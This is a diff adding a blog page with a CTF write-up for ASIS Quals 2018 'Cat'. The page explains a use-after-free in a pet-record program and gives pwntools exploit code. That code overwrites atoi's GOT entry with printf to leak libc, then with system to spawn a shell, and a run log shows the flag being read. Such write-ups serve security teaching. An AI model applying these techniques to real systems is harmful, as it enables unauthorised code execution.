@@ -1,0 +1,428 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="HandheldFriendly" content="True">
+<meta name="MobileOptimized" content="320">
+<meta name="theme-color" content="#2ecc71">
+
+
+
+
+
+<title>ASIS CTF Quals 2018 - Cat | kileak</title>
+
+
+
+
+
+<meta name="description" content="ASIS CTF Quals 2018 - Cat">
+
+
+<meta name="keywords" content="asis">
+
+
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+
+
+
+
+
+
+<link rel="canonical" href="https://kileak.github.io/ctf/2018/asisquals18-cat/">
+<link rel="alternate" type="application/rss+xml" title="kileak" href="https://kileak.github.io/feed.xml" />
+
+
+
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-4PGFKKP0QW"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-4PGFKKP0QW');
+</script>
+
+
+<script>base_url = "";</script>
+
+  </head>
+  <body class="">
+
+    <main class="main-container">
+
+        <header class="site-header">
+
+  <div class="container txt-center">
+    <a href="#" class="nav-toogle js-menu-trigger sliding-panel-button">
+      <span></span>
+      <span></span>
+      <span></span>
+    </a>
+
+    <nav class="js-menu sliding-panel-content">
+      <ul>
+        <li><a href="/">home</a></li>
+        <li><a href="https://www.youtube.com/channel/UCi-IXmtQLrJjg5Ji78DqvAg/videos" target="_blank">youtube</a></li>
+        <li><a href="/feed.xml" target="_blank"><i class="icon icon-feed"></i> feed</a></li>
+      </ul>
+    </nav>
+    <div class="js-menu-screen sliding-panel-fade-screen"></div>
+
+    <a href="/" class="author-thumb dot">
+      <img src="/images/author.jpg" alt="Author thumbnail" class="dot">
+    </a>
+
+    <!--
+    <a href="https://www.youtube.com/channel/UCi-IXmtQLrJjg5Ji78DqvAg/videos" target="_blank" class="youtube-thumb dot">
+      <img src="/images/youtube-icon.png" alt="Youtube" class "dot">
+    </a>
+    -->
+
+    
+      <h1 class="post-title">ASIS CTF Quals 2018 - Cat</h1>
+      <p class="post-meta">Apr 29, 2018</p>
+    
+
+  </div>
+
+</header>
+
+
+        <section class="main-content">
+          <article class="post">
+
+  <div class="post-content container">
+    <blockquote>
+  <p>ASIS CTF Quals 2018 - Cat
+<!--break--></p>
+
+  <p>Register the cute pet! 🐱</p>
+
+  <p>nc 178.62.40.102 6000</p>
+
+  <p>Attachment: <a href="https://kileak.github.io/assets/cat/Cat">Cat</a> <a href="https://kileak.github.io/assets/cat/libc-2.23.so">libc-2.23.so</a> <a href="https://kileak.github.io/assets/cat/xpl.py">xpl.py</a></p>
+</blockquote>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">CANARY    : ENABLED
+FORTIFY   : disabled
+NX        : ENABLED
+PIE       : disabled
+RELRO     : Partial</code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">$$$$$$$\             $$\           $$$$$$$\                      $$\             $$\                         
+$$  __$$\            $$ |          $$  __$$\                     \__|            $$ |                        
+$$ |  $$ | $$$$$$\ $$$$$$\         $$ |  $$ | $$$$$$\   $$$$$$\  $$\  $$$$$$$\ $$$$$$\    $$$$$$\   $$$$$$\  
+$$$$$$$  |$$  __$$\\_$$  _|        $$$$$$$  |$$  __$$\ $$  __$$\ $$ |$$  _____|\_$$  _|  $$  __$$\ $$  __$$\ 
+$$  ____/ $$$$$$$$ | $$ |          $$  __$$&lt; $$$$$$$$ |$$ /  $$ |$$ |\$$$$$$\    $$ |    $$$$$$$$ |$$ |  \__|
+$$ |      $$   ____| $$ |$$\       $$ |  $$ |$$   ____|$$ |  $$ |$$ | \____$$\   $$ |$$\ $$   ____|$$ |      
+$$ |      \$$$$$$$\  \$$$$  |      $$ |  $$ |\$$$$$$$\ \$$$$$$$ |$$ |$$$$$$$  |  \$$$$  |\$$$$$$$\ $$ |      
+\__|       \_______|  \____/       \__|  \__| \_______| \____$$ |\__|\_______/    \____/  \_______|\__|      
+                                                       $$\   $$ |                                            
+                                                       \$$$$$$  |                                            
+                                                        \______/                                             
+
+------------------------------------------------
+ 1: create pet record
+ 2: edit pet record
+ 3: print record
+ 4: print all record
+ 5: delete record
+ 6: exit
+------------------------------------------------
+which command?
+&gt; </code></pre></figure>
+
+<p>When we create a pet, it will create a <code class="language-plaintext highlighter-rouge">Pet</code> struct, in which it’s name, kind and age will be stored</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="k">struct</span> <span class="n">Pet</span> <span class="p">{</span>
+  <span class="kt">char</span><span class="o">*</span>   <span class="n">Name</span><span class="p">;</span>
+  <span class="kt">char</span><span class="o">*</span>   <span class="n">Kind</span><span class="p">;</span>
+  <span class="kt">long</span>    <span class="n">Age</span><span class="p">;</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>There’s nothing special in the pet creation, it will just malloc the memory for the <code class="language-plaintext highlighter-rouge">Pet</code> struct, name, kind and reads into it.</p>
+
+<p>But the <code class="language-plaintext highlighter-rouge">edit_pet_record</code> function has a small caveat.</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="nf">edit_pet_record</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="n">Pet</span> <span class="o">*</span><span class="n">pet</span><span class="p">;</span>
+
+  <span class="kt">int</span> <span class="n">index</span> <span class="o">=</span> <span class="n">read_index</span><span class="p">();</span>
+  <span class="p">...</span>
+  <span class="k">else</span> <span class="k">if</span> <span class="p">(</span> <span class="n">PET_TABLE</span><span class="p">[</span><span class="n">index</span><span class="p">]</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="c1">// If ptr is not NULL, this won't alloc new memory but reuse ptr</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">ptr</span> <span class="p">)</span>
+    <span class="p">{</span>
+      <span class="n">ptr</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x18</span><span class="p">);</span>
+      <span class="n">pet</span> <span class="o">=</span> <span class="n">ptr</span><span class="p">;</span>
+      <span class="n">pet</span><span class="o">-&gt;</span><span class="n">Name</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x17</span><span class="p">);</span>      
+      <span class="n">pet</span><span class="o">-&gt;</span><span class="n">Kind</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x17</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"What's the pet's name?</span><span class="se">\n</span><span class="s">&gt; "</span><span class="p">);</span>
+    <span class="kt">int</span> <span class="n">read_bytes</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">ptr</span><span class="o">-&gt;</span><span class="n">Name</span><span class="p">,</span> <span class="mh">0x16</span><span class="p">);</span>
+    <span class="n">ptr</span><span class="o">-&gt;</span><span class="n">Name</span><span class="p">[</span><span class="n">read_bytes</span> <span class="o">-</span> <span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+
+    <span class="n">printf</span><span class="p">(</span><span class="s">"What's the pet's kind?</span><span class="se">\n</span><span class="s">&gt; "</span><span class="p">);</span>
+    <span class="n">read_bytes</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">ptr</span><span class="o">-&gt;</span><span class="n">Kind</span><span class="p">,</span> <span class="mh">0x16</span><span class="p">);</span>
+    <span class="n">ptr</span><span class="o">-&gt;</span><span class="n">Kind</span><span class="p">[</span><span class="n">read_bytes</span> <span class="o">-</span> <span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+
+    <span class="n">printf</span><span class="p">(</span><span class="s">"How old?</span><span class="se">\n</span><span class="s">&gt; "</span><span class="p">);</span>
+    <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">buf</span><span class="p">,</span> <span class="mi">4</span><span class="p">);</span>    
+    <span class="n">pet</span><span class="o">-&gt;</span><span class="n">Age</span> <span class="o">=</span> <span class="n">atoi</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">);</span>
+
+    <span class="n">printf</span><span class="p">(</span><span class="s">"Would you modify? (y)/n&gt; "</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">buf</span><span class="p">);</span>
+    <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">buf</span><span class="p">,</span> <span class="mi">4</span><span class="p">);</span>
+
+    <span class="k">if</span> <span class="p">(</span> <span class="n">buf</span> <span class="o">==</span> <span class="sc">'n'</span> <span class="p">)</span>
+    <span class="p">{</span>
+      <span class="kt">char</span> <span class="o">*</span><span class="n">pPetName</span> <span class="o">=</span> <span class="n">ptr</span><span class="o">-&gt;</span><span class="n">Name</span><span class="p">;</span>
+      <span class="kt">char</span> <span class="o">*</span><span class="n">pPetKind</span> <span class="o">=</span> <span class="n">ptr</span><span class="o">-&gt;</span><span class="n">Kind</span><span class="p">;</span>
+
+      <span class="c1">// ptr gets freed but the pointer won't be zeroed</span>
+      <span class="n">free</span><span class="p">(</span><span class="n">ptr</span><span class="p">);</span>   
+      <span class="n">free</span><span class="p">(</span><span class="n">pPetName</span><span class="p">);</span>
+      <span class="n">free</span><span class="p">(</span><span class="n">pPetKind</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="k">else</span>
+    <span class="p">{</span>
+      <span class="n">free</span><span class="p">(</span><span class="n">PET_TABLE</span><span class="p">[</span><span class="n">index</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">Name</span><span class="p">);</span>
+      <span class="n">free</span><span class="p">(</span><span class="n">PET_TABLE</span><span class="p">[</span><span class="n">index</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">Kind</span><span class="p">);</span>
+      <span class="n">free</span><span class="p">(</span><span class="n">PET_TABLE</span><span class="p">[</span><span class="n">index</span><span class="p">]);</span>
+      <span class="n">PET_TABLE</span><span class="p">[</span><span class="n">index</span><span class="p">]</span> <span class="o">=</span> <span class="n">ptr</span><span class="p">;</span>
+      <span class="n">ptr</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
+      <span class="n">printf</span><span class="p">(</span><span class="s">"edit id %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">index</span><span class="p">);</span>
+    <span class="p">}</span>    
+  <span class="p">}</span>
+  <span class="p">...</span>
+<span class="p">}</span></code></pre></figure>
+
+<p><code class="language-plaintext highlighter-rouge">ptr</code> is a global pointer pointing to the current <code class="language-plaintext highlighter-rouge">editing pet</code> and is used to read the data for modifying a pet.</p>
+
+<p>When we entered all information, it will ask us, if we really want to modify the current pet. If so, it will free the memory allocated for our pet on the heap, and replace the entry in the <code class="language-plaintext highlighter-rouge">PET_TABLE</code> with the <code class="language-plaintext highlighter-rouge">ptr</code> chunk and zero it out.</p>
+
+<p>But if we deny to modify it, it will free <code class="language-plaintext highlighter-rouge">ptr</code> but don’t zero it out. So if we try to <code class="language-plaintext highlighter-rouge">edit</code> a pet again, <code class="language-plaintext highlighter-rouge">ptr</code> will still point to the freed memory, thus not getting reallocated and we have an UAF at hand.</p>
+
+<p>We can use this, to create another pet, which will get the memory previously containing <code class="language-plaintext highlighter-rouge">ptr</code> served by malloc and we still have the <code class="language-plaintext highlighter-rouge">ptr</code> pointer pointing to it, so we can directly edit its content (which are the pointers for name and kind :))</p>
+
+<p>Overview of the initial attack</p>
+
+<ul>
+  <li>Create a pet</li>
+  <li>Edit the pet without modifying. This will create <code class="language-plaintext highlighter-rouge">ptr</code> and free it without resetting it</li>
+  <li>Create another pet. This will create another chunk, which <code class="language-plaintext highlighter-rouge">kind</code> will overwrite the struct of <code class="language-plaintext highlighter-rouge">ptr</code> and thus its <code class="language-plaintext highlighter-rouge">name</code> and <code class="language-plaintext highlighter-rouge">kind</code> pointer</li>
+  <li>Let the <code class="language-plaintext highlighter-rouge">name</code> pointer of <code class="language-plaintext highlighter-rouge">ptr</code> point to <code class="language-plaintext highlighter-rouge">atoi</code></li>
+  <li>Edit the pet again, but this time modify it
+    <ul>
+      <li>This will write the name we give it to the pointer we just put there (=&gt; <code class="language-plaintext highlighter-rouge">atoi got</code>)</li>
+      <li>Overwrite <code class="language-plaintext highlighter-rouge">atoi got</code> with <code class="language-plaintext highlighter-rouge">printf plt</code></li>
+      <li>We can now use format string parameters to leak addresses from the stack</li>
+    </ul>
+  </li>
+</ul>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">r</span><span class="p">):</span>
+  <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">)</span>
+
+  <span class="n">create_pet</span><span class="p">(</span><span class="s">"A"</span><span class="o">*</span><span class="mh">0x16</span><span class="p">,</span> <span class="s">"B"</span><span class="o">*</span><span class="mh">0x16</span><span class="p">,</span> <span class="mi">100</span><span class="p">)</span>           <span class="c1"># 0
+</span>  <span class="n">edit_pet</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s">"A"</span><span class="o">*</span><span class="mh">0x16</span><span class="p">,</span> <span class="s">"B"</span><span class="o">*</span><span class="mh">0x16</span><span class="p">,</span> <span class="mi">100</span><span class="p">,</span> <span class="bp">False</span><span class="p">)</span>
+
+  <span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">e</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s">"atoi"</span><span class="p">])</span>
+  <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x602500</span><span class="p">)</span>
+  <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x602600</span><span class="p">)</span>
+
+  <span class="n">create_pet</span><span class="p">(</span><span class="s">"C"</span><span class="o">*</span><span class="mh">0x16</span><span class="p">,</span> <span class="n">payload</span><span class="p">,</span> <span class="mi">100</span><span class="p">)</span>            <span class="c1"># 1
+</span>
+  <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Overwrite atoi with printf"</span><span class="p">)</span>
+
+  <span class="n">edit_pet</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">e</span><span class="p">.</span><span class="n">plt</span><span class="p">[</span><span class="s">"printf"</span><span class="p">]),</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">),</span> <span class="mi">100</span><span class="p">,</span> <span class="bp">True</span><span class="p">)</span>
+  
+  <span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+  
+  <span class="k">return</span></code></pre></figure>
+
+<p>Since <code class="language-plaintext highlighter-rouge">atoi</code> now points to <code class="language-plaintext highlighter-rouge">printf</code>, every time, we enter a choice for the menu, the binary will call <code class="language-plaintext highlighter-rouge">printf</code> on it instead of converting it to a number with <code class="language-plaintext highlighter-rouge">atoi</code>.</p>
+
+<p>Only problem, the binary only reads 4 bytes for the menu choice, so we cannot use arbitrary format strings, but it’s enough to leak first 10 format string parameters (which should contain a libc address).</p>
+
+<p>There’s another way to get around this restriction, which I used to find out, which libc is used remote. Will show this at the end, since it’s not used in the final exploit at all.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Leak libc"</span><span class="p">)</span>
+
+<span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">)</span>
+  
+<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"%3$p"</span><span class="p">)</span>
+<span class="n">LEAK</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Invalid"</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="bp">True</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>
+
+<span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">LEAK</span> <span class="o">-</span> <span class="mh">0xf7230</span> <span class="o">-</span> <span class="mh">0x30</span>
+
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"LEAK          : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">LEAK</span><span class="p">))</span>
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"LIBC          : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">address</span><span class="p">))</span></code></pre></figure>
+
+<p>With libc base address at hand, we can now just overwrite <code class="language-plaintext highlighter-rouge">atoi</code> again, but this time with <code class="language-plaintext highlighter-rouge">system</code>.</p>
+
+<p>We should note here, that our input won’t get converted to a number anymore, since <code class="language-plaintext highlighter-rouge">atoi</code> isn’t existing anymore.</p>
+
+<p>But <code class="language-plaintext highlighter-rouge">printf</code> will return the number of bytes printed, so we just have to adapt, that instead of sending a <code class="language-plaintext highlighter-rouge">2</code> for <code class="language-plaintext highlighter-rouge">edit_pet</code> we’ll be sending <code class="language-plaintext highlighter-rouge">..\x00</code> (which will result in a 2, when printf wrote it). See the attached exploit for the modifications on the create/edit functions to take care of that.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Overwrite atoi with system"</span><span class="p">)</span>
+<span class="n">create_pet</span><span class="p">(</span><span class="s">"D"</span><span class="o">*</span><span class="mh">0x16</span><span class="p">,</span> <span class="s">"E"</span><span class="o">*</span><span class="mh">0x16</span><span class="p">,</span> <span class="mi">100</span><span class="p">,</span> <span class="bp">True</span><span class="p">)</span> <span class="c1"># 2 
+</span>
+<span class="n">edit_pet</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="s">"A"</span><span class="o">*</span><span class="mh">0x16</span><span class="p">,</span> <span class="s">"B"</span><span class="o">*</span><span class="mh">0x16</span><span class="p">,</span> <span class="mi">100</span><span class="p">,</span> <span class="bp">False</span><span class="p">,</span> <span class="bp">True</span><span class="p">)</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">e</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s">"atoi"</span><span class="p">])</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x602500</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x602600</span><span class="p">)[:</span><span class="mi">6</span><span class="p">]</span>
+
+<span class="n">create_pet</span><span class="p">(</span><span class="s">"C"</span><span class="o">*</span><span class="mh">0x16</span><span class="p">,</span> <span class="n">payload</span><span class="p">,</span> <span class="mi">100</span><span class="p">,</span> <span class="bp">True</span><span class="p">)</span>  <span class="c1"># 3
+</span>  
+<span class="n">edit_pet</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"system"</span><span class="p">]),</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">),</span> <span class="mi">100</span><span class="p">,</span> <span class="bp">True</span><span class="p">)</span></code></pre></figure>
+
+<p>Idea stays the same, now everything we enter for the menu, will be executed by <code class="language-plaintext highlighter-rouge">system</code> instead of <code class="language-plaintext highlighter-rouge">atoi</code>, but again only 4 bytes for input.</p>
+
+<p>Well, that’s more than enough to send <code class="language-plaintext highlighter-rouge">sh</code>, triggering a shell.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"sh"</span><span class="p">)</span>
+
+<span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span></code></pre></figure>
+
+<p>And there we go</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">$ python xpl.py 1
+[*] '/home/kileak/cat/Cat'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+[*] '/home/kileak/cat/libc.so.6'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[+] Opening connection to 178.62.40.102 on port 6000: Done
+[*] Overwrite atoi with printf
+[*] Leak libc
+[*] LEAK          : 0x7f05469cc260
+[*] LIBC          : 0x7f05468d5000
+[*] Overwrite atoi with system
+[*] Switching to interactive mode
+$ cat /home/pwn/flag
+ASIS{5aa9607cca34dba443c2b757a053665179f3f85c}</code></pre></figure>
+
+<p>As a sidenote for finding the used libc. Instead of overwriting <code class="language-plaintext highlighter-rouge">atoi</code> with <code class="language-plaintext highlighter-rouge">printf</code>, we can also overwrite <code class="language-plaintext highlighter-rouge">free</code> with <code class="language-plaintext highlighter-rouge">printf</code> and put a format string into our pet record, which then gets parsed by <code class="language-plaintext highlighter-rouge">printf</code> when we free that record.</p>
+
+<p>Short example</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">create_pet</span><span class="p">(</span><span class="s">"A"</span><span class="o">*</span><span class="mh">0x16</span><span class="p">,</span> <span class="s">"B"</span><span class="o">*</span><span class="mh">0x16</span><span class="p">,</span> <span class="mi">100</span><span class="p">)</span>       
+<span class="n">edit_pet</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s">"A"</span><span class="o">*</span><span class="mh">0x16</span><span class="p">,</span> <span class="s">"B"</span><span class="o">*</span><span class="mh">0x16</span><span class="p">,</span> <span class="mi">100</span><span class="p">,</span> <span class="bp">False</span><span class="p">)</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">e</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s">"free"</span><span class="p">])</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x602500</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x602600</span><span class="p">)</span>
+
+<span class="n">create_pet</span><span class="p">(</span><span class="s">"%17$pp"</span><span class="p">,</span> <span class="n">payload</span><span class="p">,</span> <span class="mi">100</span><span class="p">)</span>        
+<span class="n">edit_pet</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">e</span><span class="p">.</span><span class="n">plt</span><span class="p">[</span><span class="s">"printf"</span><span class="p">]),</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">),</span> <span class="mi">100</span><span class="p">,</span> <span class="bp">True</span><span class="p">)</span></code></pre></figure>
+
+<p>If we then free pet 1, it will print out the 17th parameter</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">$ 5
+which id?
+&gt; $ 1
+0x7f6cb8673830\x18 `\x90Ыdelete id 1
+------------------------------------------------</code></pre></figure>
+
+<p>which is <code class="language-plaintext highlighter-rouge">__libc_start_main + 240</code></p>
+
+<p>With <code class="language-plaintext highlighter-rouge">libc-database</code>, we can then find the used <code class="language-plaintext highlighter-rouge">libc</code></p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">./find __libc_start_main 740
+ubuntu-xenial-amd64-libc6 (id libc6_2.23-0ubuntu10_amd64)</code></pre></figure>
+
+<p>But I’d overwrite <code class="language-plaintext highlighter-rouge">free</code> with <code class="language-plaintext highlighter-rouge">printf</code> only for the initial leaking, because we lose the possibility to do another UAF afterwards otherwise.</p>
+
+
+    <aside class="share">
+
+      <span>Share this: </span>
+
+      <a href="http://twitter.com/share?text=ASIS CTF Quals 2018 - Cat&amp;url=https://kileak.github.io/ctf/2018/asisquals18-cat/"
+      onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+        <i class="icon icon-twitter-rounded"></i>
+      </a>
+
+      <a href="https://www.facebook.com/sharer/sharer.php?u=https://kileak.github.io/ctf/2018/asisquals18-cat/"
+      onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
+        <i class="icon icon-facebook-rounded"></i>
+      </a>
+
+    </aside>
+  </div>
+
+  
+  <hr>
+  <aside id="comments" class="disqus">
+    <div class="container">
+      <h3><i class="icon icon-comments-o"></i> Comments</h3>
+      <div id="disqus_thread"></div>
+
+      <script type="text/javascript">
+        var disqus_shortname = 'kileak';
+        var disqus_identifier = '/ctf/2018/asisquals18-cat';
+        var disqus_title = 'ASIS CTF Quals 2018 - Cat';
+        var disqus_url = 'https://kileak.github.io/ctf/2018/asisquals18-cat';
+
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+      </script>
+
+      <noscript>
+        Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a>
+      </noscript>
+    </div>
+  </aside>
+
+
+
+</article>
+
+        </section>
+
+        
+<div class="clearfix"></div>
+
+<footer class="site-footer txt-center">
+  <hr>
+
+  <ul class="social">
+    
+  </ul>
+
+  <small>&copy; 2025 All rights reserved. Made with <a href="http://jekyllrb.com" target="_blank">Jekyll</a> and <i class="icon icon-heart"></i></small>
+  <small>by <a href="http://nandomoreira.me" target="_blank">nandomoreira.me</a></small>
+
+</footer>
+
+
+    </main>
+
+    <a href="http://github.com/Kileak" target="_blank" class="github-corner"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#000; color:#fff; position: absolute; top: 0; border: 0; right: 0;"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+    <script src="/js/jquery.min.js"></script>
+    <script src="/js/jekyll-search.min.js"></script>
+    <script src="/js/main.js"></script>
+  </body>
+</html>
